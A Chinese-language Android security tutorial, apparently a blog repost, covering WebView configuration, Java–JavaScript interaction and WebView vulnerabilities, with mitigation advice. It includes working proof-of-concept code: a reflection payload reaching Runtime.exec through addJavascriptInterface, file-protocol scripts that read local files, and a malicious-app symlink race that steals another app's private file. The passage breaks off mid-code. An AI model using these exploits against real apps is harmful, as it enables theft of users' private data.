class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure><p>第三步：进行配置-利用WebSettings子类（常见方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); </span><br><span class="line"></span><br><span class="line"><span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>常见方法：设置WebView缓存</p><ul><li>当加载 html 页面时，WebView会在/data/data/包名目录下生成 database 与 cache 两个文件夹</li><li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li></ul><h5 id="WebViewClient类"><strong>WebViewClient类</strong></h5><p>作用：用来处理各种通知 &amp; 请求事件</p><p><strong>shouldOverrideUrlLoading()</strong></p><p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p><h4 id="webview与js加护">webview与js加护</h4><p><img src="assets/905443_F97H8PAK73A38RC.png" alt="image-20220726171737615"></p><h5 id="Android调用JS">Android调用JS</h5><p>准备js文件，放到assets中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p><p>onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</p><p>还可以使用**WebView.evaluateJavascript()**调用js代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Webview漏洞-2">Webview漏洞</h3><h4 id="漏洞类型概括">漏洞类型概括</h4><p><img src="https://bbs.kanxue.com/upload/attach/202207/905443_E25ZWREXH5JZHN2.png" alt="image-20220729145936266"></p><p><img src="assets/905443_C8YTUCX4746WZHB-17271001469662.png" alt="image-20220729152654652"></p><h4 id="历史漏洞">历史漏洞</h4><h5 id="Webview任意代码执行漏洞">Webview任意代码执行漏洞</h5><p><strong>addJavascriptInterface接口引起远程代码执行漏洞</strong></p><p><strong>漏洞原理</strong></p><p>JS和Android的直接通信可以通过addJavascriptInterface接口进行对象映射</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JSObject(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure><p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p><p>具体的攻击步骤：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass()</span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型<span class="keyword">Class</span></span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： <span class="keyword">Class</span>.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.<span class="keyword">Runtime</span> 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure><p><strong>示例代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞防护</strong></p><p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用。</p><h5 id="webview明文存储漏洞">webview明文存储漏洞</h5><p>WebView默认开启密码保存功能 ：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure><p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p><p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p><p><strong>安全防护：</strong></p><p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p><h4 id="跨域漏洞"><strong>跨域漏洞</strong></h4><p>WebView开启了file域访问，且允许file域对http域进行访问，同时未对file域的路径进行严格限制所致，攻击者通过URL Scheme的方式，可远程打开并加载恶意HTML文件，远程获取app中包括用户登录凭证在内的所有本地敏感数据。</p><p>针对这个漏洞，涉及如下几个api函数：</p><p><img src="assets/image-20240930170405744.png" alt="image-20240930170405744"></p><h5 id="任意文件窃取-应用克隆漏洞">任意文件窃取(应用克隆漏洞)</h5><p><strong>漏洞原理</strong></p><p>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>这样使得WebView可以使用File协议和加载js代码读取本地文件，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息。</p><p><strong>漏洞复现</strong></p><p>我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p><p><img src="assets/905443_D6RRGQX47ZWBV4B.png" alt="image-20220729195648955"></p><p>编写一个js文件来读取本地文件：<strong>fileAttack.html</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)  <span class="comment">//当XMLHttpRequest发生变化时 触发回调</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)          <span class="comment">//请求是否完成     </span></span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们将这个文件上传至手机 /data/local/tmp下</p><p>编写攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h5 id="通用协议漏洞-恶意页面注入">通用协议漏洞(恶意页面注入)</h5><p>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p><p>我们将上面html中的访问改为看雪的网站：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p><h5 id="安全防护-2"><strong>安全防护</strong></h5><ul><li>检查应用是否使用了webview控件</li><li>避免app内部的webview被不信任的第三方调用，排查内置webview的activity是否被导出，必须导出的activity是否会通过参数传递调起内置的webview</li><li>file域访问为非必要功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li></ul><p>若要开启file域访问，则设置file路径的白名单，严格控制file域访问范围，具体如下</p><ul><li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:///android_asset 和 file:///android_res 在不开启 API 的情况下也可以访问；</li><li>可能会更新的 HTML 文件放在 /data/data/(app) 目录下，避免被第三方替换或修改；</li><li>对 file 域请求做白名单限制时，需要对“…/…/”特殊情况进行处理，避免白名单被绕过。</li></ul><h5 id="符号链接跨源攻击">符号链接跨源攻击</h5><p><a href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p><p>这类漏洞，只有<strong>setAllowFileAccess为True</strong></p><p><strong>漏洞原理</strong></p><p><img src="assets/905443_NW7GHWBMGDNE5TU.png" alt="image-20220729202532795"></p><p>攻击过程：首先是操控webview去访问攻击app自己公开的一个网页，然后这个网页执行的内容其实是延时去读取自身，在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软连接，指向受害者app的一个私有文件，最终读取窃取内容</p><p>构造HTML文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的HTML,被检测APP加载此html，执行JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var d = document;</span><br><span class="line">function loadDatabase()</span><br><span class="line">&#123;</span><br><span class="line">    var file_url = d.URL;</span><br><span class="line">    var xmlhttp =new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onload=function() &#123;    //回调函数 当请求完成时执行</span><br><span class="line">         document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span><br><span class="line">        alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,file_url);</span><br><span class="line">    xmlhttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造恶意app的攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">          #新建文件夹，用于存放恶意HTML文件</span><br><span class="line">           cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">           #将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span 